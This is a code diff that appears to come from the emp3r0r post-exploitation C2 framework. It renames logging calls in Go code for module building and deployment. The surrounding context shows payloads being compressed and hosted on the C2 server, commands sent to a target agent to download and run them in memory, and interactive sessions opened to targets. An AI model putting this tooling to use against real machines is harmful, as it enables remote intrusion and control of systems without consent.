@@ -30,7 +30,7 @@ var ModuleNames = make(map[string]string)
 func moduleCustom() {
 	config, exists := ModuleConfigs[CurrentMod]
 	if !exists {
-		CliPrintError("Config of %s does not exist", CurrentMod)
+		LogError("Config of %s does not exist", CurrentMod)
 		return
 	}
 
@@ -39,14 +39,14 @@ func moduleCustom() {
 	// build module on C2
 	out, err := build_module(&config)
 	if err != nil {
-		CliPrintError("Build module %s: %v", config.Name, err)
+		LogError("Build module %s: %v", config.Name, err)
 		return
 	}
-	CliPrint("Module output:\n%s", out)
+	LogMsg("Module output:\n%s", out)
 
 	// if module is a plugin, no need to upload and execute files on target
 	if config.IsLocal {
-		CliPrint("%s will run as a plugin on C2, no files will be executed on target", config.Name)
+		LogMsg("%s will run as a plugin on C2, no files will be executed on target", config.Name)
 		return
 	}
 
@@ -56,7 +56,7 @@ func moduleCustom() {
 	// agent side configs
 	payload_type, exec_cmd, envStr, err := genModStartCmd(&config)
 	if err != nil {
-		CliPrintError("Parsing module config: %v", err)
+		LogError("Parsing module config: %v", err)
 		return
 	}
 
@@ -93,7 +93,7 @@ func build_module(config *emp3r0r_def.ModuleConfig) (out []byte, err error) {
 	}
 
 	// build module
-	CliPrintInfo("Building %s...", config.Name)
+	LogInfo("Building %s...", config.Name)
 	out, err = exec.Command("sh", "-c", config.Build).CombinedOutput()
 	if err != nil {
 		err = fmt.Errorf("%s (%v)", out, err)
@@ -107,7 +107,7 @@ func updateModuleOptions(config *emp3r0r_def.ModuleConfig) {
 	for opt, modOption := range config.Options {
 		option, ok := CurrentModuleOptions[opt]
 		if !ok {
-			CliPrintError("Option '%s' not found", opt)
+			LogError("Option '%s' not found", opt)
 			return
 		}
 		modOption.OptVal = option.Val
@@ -124,31 +124,31 @@ func getDownloadAddr() string {
 
 func handleInMemoryModule(config emp3r0r_def.ModuleConfig, payload_type, download_addr string) {
 	hosted_file := WWWRoot + CurrentMod + ".xz"
-	CliPrintInfo("Compressing %s with xz...", CurrentMod)
+	LogInfo("Compressing %s with xz...", CurrentMod)
 	path := fmt.Sprintf("%s/%s", config.Path, config.AgentConfig.Exec)
 	data, err := os.ReadFile(path)
 	if err != nil {
-		CliPrintError("Reading %s: %v", path, err)
+		LogError("Reading %s: %v", path, err)
 		return
 	}
 	compressedBytes, err := arc.CompressXz(data)
 	if err != nil {
-		CliPrintError("Compressing %s: %v", path, err)
+		LogError("Compressing %s: %v", path, err)
 		return
 	}
-	CliPrintInfo("Created %.4fMB archive (%s) for module '%s'", float64(len(compressedBytes))/1024/1024, hosted_file, CurrentMod)
+	LogInfo("Created %.4fMB archive (%s) for module '%s'", float64(len(compressedBytes))/1024/1024, hosted_file, CurrentMod)
 	err = os.WriteFile(hosted_file, compressedBytes, 0o600)
 	if err != nil {
-		CliPrintError("Writing %s: %v", hosted_file, err)
+		LogError("Writing %s: %v", hosted_file, err)
 		return
 	}
 	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s",
 		emp3r0r_def.C2CmdCustomModule, CurrentMod, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
 	cmd_id := uuid.NewString()
-	CliPrintDebug("Sending command %s to %s", cmd, CurrentTarget.Tag)
+	LogDebug("Sending command %s to %s", cmd, CurrentTarget.Tag)
 	err = SendCmdToCurrentTarget(cmd, cmd_id)
 	if err != nil {
-		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+		LogError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
 	}
 }
 
@@ -156,17 +156,17 @@ func handleCompressedModule(config emp3r0r_def.ModuleConfig, payload_type, exec_
 	tarball_path := WWWRoot + CurrentMod + ".tar.xz"
 	file_to_download := filepath.Base(tarball_path)
 	if !util.IsFileExist(tarball_path) {
-		CliPrintInfo("Compressing %s with tar.xz...", CurrentMod)
+		LogInfo("Compressing %s with tar.xz...", CurrentMod)
 		path := config.Path
 		err := util.TarXZ(path, tarball_path)
 		if err != nil {
-			CliPrintError("Compressing %s: %v", CurrentMod, err)
+			LogError("Compressing %s: %v", CurrentMod, err)
 			return
 		}
-		CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
+		LogInfo("Created %.4fMB archive (%s) for module '%s'",
 			float64(util.FileSize(tarball_path))/1024/1024, tarball_path, CurrentMod)
 	} else {
-		CliPrintInfo("Using cached %s", tarball_path)
+		LogInfo("Using cached %s", tarball_path)
 	}
 
 	checksum := tun.SHA256SumFile(tarball_path)
@@ -176,7 +176,7 @@ func handleCompressedModule(config emp3r0r_def.ModuleConfig, payload_type, exec_
 	cmd_id := uuid.NewString()
 	err := SendCmdToCurrentTarget(cmd, cmd_id)
 	if err != nil {
-		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+		LogError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
 	}
 
 	if config.AgentConfig.IsInteractive {
@@ -214,7 +214,7 @@ func handleInteractiveModule(config emp3r0r_def.ModuleConfig, cmd_id string) {
 		RuntimeConfig.AgentRoot, CurrentMod, config.AgentConfig.Exec),
 		args, port, false)
 	if sshErr != nil {
-		CliPrintError("module %s: %v", config.Name, sshErr)
+		LogError("module %s: %v", config.Name, sshErr)
 	}
 }
 
@@ -256,7 +256,7 @@ func ModuleDetails(modName string) {
 	table.Render()
 	out := tableString.String()
 	AdaptiveTable(out)
-	CliPrintInfo("Module details:\n%s", out)
+	LogInfo("Module details:\n%s", out)
 }
 
 // scan custom modules in ModuleDir,
@@ -271,10 +271,10 @@ func InitModules() {
 		if !util.IsExist(mod_search_dir) {
 			return
 		}
-		CliPrintDebug("Scanning %s for modules", mod_search_dir)
+		LogDebug("Scanning %s for modules", mod_search_dir)
 		dirs, readdirErr := os.ReadDir(mod_search_dir)
 		if readdirErr != nil {
-			CliPrintError("Failed to scan custom modules: %v", readdirErr)
+			LogError("Failed to scan custom modules: %v", readdirErr)
 			return
 		}
 		for _, dir := range dirs {
@@ -287,7 +287,7 @@ func InitModules() {
 			}
 			config, readConfigErr := readModCondig(config_file)
 			if readConfigErr != nil {
-				CliPrintWarning("Reading config from %s: %v", dir.Name(), readConfigErr)
+				LogWarning("Reading config from %s: %v", dir.Name(), readConfigErr)
 				continue
 			}
 
@@ -297,12 +297,12 @@ func InitModules() {
 				mod_dir := fmt.Sprintf("%s/modules/%s", EmpWorkSpace, dir.Name())
 				err := os.MkdirAll(mod_dir, 0o700)
 				if err != nil {
-					CliPrintWarning("Failed to create %s: %v", mod_dir, err)
+					LogWarning("Failed to create %s: %v", mod_dir, err)
 					continue
 				}
 				err = util.Copy(config.Path, mod_dir)
 				if err != nil {
-					CliPrintWarning("Copying %s to %s: %v", config.Path, mod_dir, err)
+					LogWarning("Copying %s to %s: %v", config.Path, mod_dir, err)
 					continue
 				}
 				config.Path = mod_dir
@@ -316,11 +316,11 @@ func InitModules() {
 
 			readConfigErr = updateModuleHelp(config)
 			if readConfigErr != nil {
-				CliPrintWarning("Loading config from %s: %v", config.Name, readConfigErr)
+				LogWarning("Loading config from %s: %v", config.Name, readConfigErr)
 				continue
 			}
 			ModuleConfigs[config.Name] = *config
-			CliPrintDebug("Loaded module %s", strconv.Quote(config.Name))
+			LogDebug("Loaded module %s", strconv.Quote(config.Name))
 		}
 
 		// make []string for fuzzysearch
@@ -334,7 +334,7 @@ func InitModules() {
 		load_mod(mod_search_dir)
 	}
 
-	CliPrintDebug("Loaded %d modules", len(ModuleHelpers))
+	LogDebug("Loaded %d modules", len(ModuleHelpers))
 }
 
 // readModCondig read config.json of a module
